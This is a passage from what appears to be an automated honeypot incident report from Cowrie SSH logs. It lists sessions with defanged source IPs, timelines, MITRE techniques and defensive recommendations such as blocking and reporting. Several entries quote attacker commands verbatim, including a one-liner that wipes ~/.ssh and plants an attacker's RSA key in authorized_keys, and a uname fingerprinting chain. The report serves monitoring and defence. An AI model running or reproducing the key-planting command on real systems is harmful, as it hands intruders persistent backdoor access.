| `2026-08-29 17:13:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]10` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-522c6bb35a8e

| Field | Detail |
|---|---|
| **Source IP** | `117.248.201[.]39` |
| **First Seen** | 2026-08-29 17:13 |
| **Last Seen** | 2026-08-29 17:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:13:45` | `cowrie.session.connect` |
| `2026-08-29 17:13:45` | `cowrie.client.version` |
| `2026-08-29 17:13:45` | `cowrie.client.kex` |
| `2026-08-29 17:13:47` | `cowrie.login.success` |
| `2026-08-29 17:13:48` | `cowrie.direct-tcpip.request` |
| `2026-08-29 17:13:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.248.201[.]39` to AbuseIPDB if not already reported
- [ ] Block `117.248.201[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ab29f0ce48b

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 17:15 |
| **Last Seen** | 2026-08-29 17:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:15:11` | `cowrie.session.connect` |
| `2026-08-29 17:15:11` | `cowrie.client.version` |
| `2026-08-29 17:15:11` | `cowrie.client.kex` |
| `2026-08-29 17:15:11` | `cowrie.login.success` |
| `2026-08-29 17:15:12` | `cowrie.session.params` |
| `2026-08-29 17:15:12` | `cowrie.command.input` |
| `2026-08-29 17:15:12` | `cowrie.command.input` |
| `2026-08-29 17:15:12` | `cowrie.command.input` |
| `2026-08-29 17:15:12` | `cowrie.command.input` |
| `2026-08-29 17:15:12` | `cowrie.command.input` |
| `2026-08-29 17:15:12` | `cowrie.command.success` |
| `2026-08-29 17:15:12` | `cowrie.command.input` |
| `2026-08-29 17:15:12` | `cowrie.command.input` |
| `2026-08-29 17:15:12` | `cowrie.command.input` |
| `2026-08-29 17:15:12` | `cowrie.command.input` |
| `2026-08-29 17:15:12` | `cowrie.log.closed` |
| `2026-08-29 17:15:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a924702e8ac0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 17:15 |
| **Last Seen** | 2026-08-29 17:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:15:42` | `cowrie.session.connect` |
| `2026-08-29 17:15:42` | `cowrie.client.version` |
| `2026-08-29 17:15:42` | `cowrie.client.kex` |
| `2026-08-29 17:15:43` | `cowrie.login.success` |
| `2026-08-29 17:15:43` | `cowrie.direct-tcpip.request` |
| `2026-08-29 17:15:43` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 17:15:43` | `cowrie.direct-tcpip.data` |
| `2026-08-29 17:15:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eedc7d9117da

| Field | Detail |
|---|---|
| **Source IP** | `195.86.192[.]66` |
| **First Seen** | 2026-08-29 17:16 |
| **Last Seen** | 2026-08-29 17:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:16:13` | `cowrie.session.connect` |
| `2026-08-29 17:16:13` | `cowrie.client.version` |
| `2026-08-29 17:16:13` | `cowrie.client.kex` |
| `2026-08-29 17:16:14` | `cowrie.login.success` |
| `2026-08-29 17:16:15` | `cowrie.session.params` |
| `2026-08-29 17:16:15` | `cowrie.command.input` |
| `2026-08-29 17:16:15` | `cowrie.command.failed` |
| `2026-08-29 17:16:15` | `cowrie.log.closed` |
| `2026-08-29 17:16:16` | `cowrie.session.params` |
| `2026-08-29 17:16:16` | `cowrie.command.input` |
| `2026-08-29 17:16:17` | `cowrie.session.file_download` |
| `2026-08-29 17:16:17` | `cowrie.log.closed` |
| `2026-08-29 17:16:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.86.192[.]66` to AbuseIPDB if not already reported
- [ ] Block `195.86.192[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f70748d88f3b

| Field | Detail |
|---|---|
| **Source IP** | `195.86.192[.]66` |
| **First Seen** | 2026-08-29 17:16 |
| **Last Seen** | 2026-08-29 17:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:16:17` | `cowrie.session.connect` |
| `2026-08-29 17:16:17` | `cowrie.client.version` |
| `2026-08-29 17:16:17` | `cowrie.client.kex` |
| `2026-08-29 17:16:18` | `cowrie.login.success` |
| `2026-08-29 17:16:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.86.192[.]66` to AbuseIPDB if not already reported
- [ ] Block `195.86.192[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2c274142284

| Field | Detail |
|---|---|
| **Source IP** | `195.86.192[.]66` |
| **First Seen** | 2026-08-29 17:16 |
| **Last Seen** | 2026-08-29 17:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:16:18` | `cowrie.session.connect` |
| `2026-08-29 17:16:18` | `cowrie.client.version` |
| `2026-08-29 17:16:19` | `cowrie.client.kex` |
| `2026-08-29 17:16:20` | `cowrie.login.success` |
| `2026-08-29 17:16:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.86.192[.]66` to AbuseIPDB if not already reported
- [ ] Block `195.86.192[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-784edce4f0dc

| Field | Detail |
|---|---|
| **Source IP** | `41.93.28[.]9` |
| **First Seen** | 2026-08-29 17:16 |
| **Last Seen** | 2026-08-29 17:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:16:35` | `cowrie.session.connect` |
| `2026-08-29 17:16:35` | `cowrie.client.version` |
| `2026-08-29 17:16:35` | `cowrie.client.kex` |
| `2026-08-29 17:16:37` | `cowrie.login.success` |
| `2026-08-29 17:16:38` | `cowrie.session.params` |
| `2026-08-29 17:16:38` | `cowrie.command.input` |
| `2026-08-29 17:16:38` | `cowrie.command.failed` |
| `2026-08-29 17:16:38` | `cowrie.log.closed` |
| `2026-08-29 17:16:39` | `cowrie.session.params` |
| `2026-08-29 17:16:39` | `cowrie.command.input` |
| `2026-08-29 17:16:39` | `cowrie.session.file_download` |
| `2026-08-29 17:16:39` | `cowrie.log.closed` |
| `2026-08-29 17:16:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.93.28[.]9` to AbuseIPDB if not already reported
- [ ] Block `41.93.28[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07207dc8eead

| Field | Detail |
|---|---|
| **Source IP** | `41.93.28[.]9` |
| **First Seen** | 2026-08-29 17:16 |
| **Last Seen** | 2026-08-29 17:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:16:40` | `cowrie.session.connect` |
| `2026-08-29 17:16:40` | `cowrie.client.version` |
| `2026-08-29 17:16:40` | `cowrie.client.kex` |
| `2026-08-29 17:16:41` | `cowrie.login.success` |
| `2026-08-29 17:16:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.93.28[.]9` to AbuseIPDB if not already reported
- [ ] Block `41.93.28[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd4b95267dd8

| Field | Detail |
|---|---|
| **Source IP** | `41.93.28[.]9` |
| **First Seen** | 2026-08-29 17:16 |
| **Last Seen** | 2026-08-29 17:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:16:42` | `cowrie.session.connect` |
| `2026-08-29 17:16:42` | `cowrie.client.version` |
| `2026-08-29 17:16:42` | `cowrie.client.kex` |
| `2026-08-29 17:16:43` | `cowrie.login.success` |
| `2026-08-29 17:16:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.93.28[.]9` to AbuseIPDB if not already reported
- [ ] Block `41.93.28[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f407186d78c

| Field | Detail |
|---|---|
| **Source IP** | `194.156.249[.]154` |
| **First Seen** | 2026-08-29 17:17 |
| **Last Seen** | 2026-08-29 17:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:17:10` | `cowrie.session.connect` |
| `2026-08-29 17:17:10` | `cowrie.client.version` |
| `2026-08-29 17:17:11` | `cowrie.client.kex` |
| `2026-08-29 17:17:11` | `cowrie.login.success` |
| `2026-08-29 17:17:12` | `cowrie.session.params` |
| `2026-08-29 17:17:12` | `cowrie.command.input` |
| `2026-08-29 17:17:12` | `cowrie.command.failed` |
| `2026-08-29 17:17:12` | `cowrie.log.closed` |
| `2026-08-29 17:17:13` | `cowrie.session.params` |
| `2026-08-29 17:17:13` | `cowrie.command.input` |
| `2026-08-29 17:17:13` | `cowrie.session.file_download` |
| `2026-08-29 17:17:13` | `cowrie.log.closed` |
| `2026-08-29 17:17:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.156.249[.]154` to AbuseIPDB if not already reported
- [ ] Block `194.156.249[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c53f0af9fd8

| Field | Detail |
|---|---|
| **Source IP** | `194.156.249[.]154` |
| **First Seen** | 2026-08-29 17:17 |
| **Last Seen** | 2026-08-29 17:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:17:13` | `cowrie.session.connect` |
| `2026-08-29 17:17:13` | `cowrie.client.version` |
| `2026-08-29 17:17:13` | `cowrie.client.kex` |
| `2026-08-29 17:17:14` | `cowrie.login.success` |
| `2026-08-29 17:17:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.156.249[.]154` to AbuseIPDB if not already reported
- [ ] Block `194.156.249[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4266f5331150

| Field | Detail |
|---|---|
| **Source IP** | `194.156.249[.]154` |
| **First Seen** | 2026-08-29 17:17 |
| **Last Seen** | 2026-08-29 17:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:17:14` | `cowrie.session.connect` |
| `2026-08-29 17:17:14` | `cowrie.client.version` |
| `2026-08-29 17:17:14` | `cowrie.client.kex` |
| `2026-08-29 17:17:15` | `cowrie.login.success` |
| `2026-08-29 17:17:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.156.249[.]154` to AbuseIPDB if not already reported
- [ ] Block `194.156.249[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-823a59b25727

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-29 17:19 |
| **Last Seen** | 2026-08-29 17:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:19:19` | `cowrie.session.connect` |
| `2026-08-29 17:19:19` | `cowrie.client.version` |
| `2026-08-29 17:19:19` | `cowrie.client.kex` |
| `2026-08-29 17:19:19` | `cowrie.login.success` |
| `2026-08-29 17:19:19` | `cowrie.direct-tcpip.request` |
| `2026-08-29 17:19:19` | `cowrie.direct-tcpip.data` |
| `2026-08-29 17:19:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49367012ceb0

| Field | Detail |
|---|---|
| **Source IP** | `65.20.237[.]94` |
| **First Seen** | 2026-08-29 17:19 |
| **Last Seen** | 2026-08-29 17:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:19:35` | `cowrie.session.connect` |
| `2026-08-29 17:19:35` | `cowrie.client.version` |
| `2026-08-29 17:19:35` | `cowrie.client.kex` |
| `2026-08-29 17:19:36` | `cowrie.login.success` |
| `2026-08-29 17:19:36` | `cowrie.direct-tcpip.request` |
| `2026-08-29 17:19:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.237[.]94` to AbuseIPDB if not already reported
- [ ] Block `65.20.237[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbcba57c199f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 17:19 |
| **Last Seen** | 2026-08-29 17:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:19:36` | `cowrie.session.connect` |
| `2026-08-29 17:19:36` | `cowrie.client.version` |
| `2026-08-29 17:19:36` | `cowrie.client.kex` |
| `2026-08-29 17:19:37` | `cowrie.login.success` |
| `2026-08-29 17:19:37` | `cowrie.session.params` |
| `2026-08-29 17:19:37` | `cowrie.command.input` |
| `2026-08-29 17:19:37` | `cowrie.command.input` |
| `2026-08-29 17:19:37` | `cowrie.command.input` |
| `2026-08-29 17:19:37` | `cowrie.command.input` |
| `2026-08-29 17:19:37` | `cowrie.command.input` |
| `2026-08-29 17:19:37` | `cowrie.command.success` |
| `2026-08-29 17:19:37` | `cowrie.command.input` |
| `2026-08-29 17:19:37` | `cowrie.command.input` |
| `2026-08-29 17:19:37` | `cowrie.command.input` |
| `2026-08-29 17:19:37` | `cowrie.command.input` |
| `2026-08-29 17:19:38` | `cowrie.log.closed` |
| `2026-08-29 17:19:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a279140afccb

| Field | Detail |
|---|---|
| **Source IP** | `179.184.85[.]167` |
| **First Seen** | 2026-08-29 17:19 |
| **Last Seen** | 2026-08-29 17:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:19:41` | `cowrie.session.connect` |
| `2026-08-29 17:19:42` | `cowrie.client.version` |
| `2026-08-29 17:19:42` | `cowrie.client.kex` |
| `2026-08-29 17:19:44` | `cowrie.login.success` |
| `2026-08-29 17:19:45` | `cowrie.direct-tcpip.request` |
| `2026-08-29 17:19:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.85[.]167` to AbuseIPDB if not already reported
- [ ] Block `179.184.85[.]167` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1148acebeb96

| Field | Detail |
|---|---|
| **Source IP** | `65.20.132[.]230` |
| **First Seen** | 2026-08-29 17:19 |
| **Last Seen** | 2026-08-29 17:19 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:19:46` | `cowrie.session.connect` |
| `2026-08-29 17:19:46` | `cowrie.client.version` |
| `2026-08-29 17:19:46` | `cowrie.client.kex` |
| `2026-08-29 17:19:49` | `cowrie.login.success` |
| `2026-08-29 17:19:50` | `cowrie.direct-tcpip.request` |
| `2026-08-29 17:19:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.132[.]230` to AbuseIPDB if not already reported
- [ ] Block `65.20.132[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4be07a570c9

| Field | Detail |
|---|---|
| **Source IP** | `210.177.143[.]61` |
| **First Seen** | 2026-08-29 17:19 |
| **Last Seen** | 2026-08-29 17:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:19:55` | `cowrie.session.connect` |
| `2026-08-29 17:19:56` | `cowrie.client.version` |
| `2026-08-29 17:19:56` | `cowrie.client.kex` |
| `2026-08-29 17:19:58` | `cowrie.login.success` |
| `2026-08-29 17:19:58` | `cowrie.direct-tcpip.request` |
| `2026-08-29 17:20:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.177.143[.]61` to AbuseIPDB if not already reported
- [ ] Block `210.177.143[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32707431cf07

| Field | Detail |
|---|---|
| **Source IP** | `103.161.113[.]136` |
| **First Seen** | 2026-08-29 17:19 |
| **Last Seen** | 2026-08-29 17:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:19:58` | `cowrie.session.connect` |
| `2026-08-29 17:19:58` | `cowrie.client.version` |
| `2026-08-29 17:19:59` | `cowrie.client.kex` |
| `2026-08-29 17:20:00` | `cowrie.login.success` |
| `2026-08-29 17:20:01` | `cowrie.session.params` |
| `2026-08-29 17:20:01` | `cowrie.command.input` |
| `2026-08-29 17:20:01` | `cowrie.command.failed` |
| `2026-08-29 17:20:01` | `cowrie.log.closed` |
| `2026-08-29 17:20:02` | `cowrie.session.params` |
| `2026-08-29 17:20:02` | `cowrie.command.input` |
| `2026-08-29 17:20:02` | `cowrie.session.file_download` |
| `2026-08-29 17:20:02` | `cowrie.log.closed` |
| `2026-08-29 17:20:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.161.113[.]136` to AbuseIPDB if not already reported
- [ ] Block `103.161.113[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22b297233d42

| Field | Detail |
|---|---|
| **Source IP** | `103.161.113[.]136` |
| **First Seen** | 2026-08-29 17:20 |
| **Last Seen** | 2026-08-29 17:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:20:02` | `cowrie.session.connect` |
